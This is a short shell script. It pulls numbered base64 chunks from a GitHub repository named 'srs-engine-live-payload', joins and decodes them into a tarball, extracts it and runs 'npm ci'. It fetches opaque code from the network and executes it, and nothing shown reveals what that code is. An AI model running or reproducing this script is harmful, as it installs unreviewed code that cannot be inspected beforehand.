#!/bin/sh
set -eu
BASE="https://raw.githubusercontent.com/wzorowam/srs-engine-live-payload-4860885/main"
i=0
rm -f /tmp/src.tgz.b64
while true; do
  name=$(printf "%02d.txt" "$i")
  if curl -fsSL "$BASE/$name" >> /tmp/src.tgz.b64; then
    i=$((i+1))
  else
    break
  fi
done
base64 -d /tmp/src.tgz.b64 > /tmp/src.tgz
tar -xzf /tmp/src.tgz
npm ci
